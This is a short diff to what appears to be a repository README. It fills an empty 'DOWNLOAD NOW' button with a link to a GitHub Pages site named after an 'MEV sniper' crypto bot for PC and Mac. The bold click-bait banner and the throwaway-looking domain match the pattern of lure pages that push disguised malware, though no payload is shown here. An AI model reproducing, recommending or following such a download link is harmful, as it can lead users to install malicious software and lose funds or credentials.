@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://mev-sniper-ot-pcwinmac-ug54.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
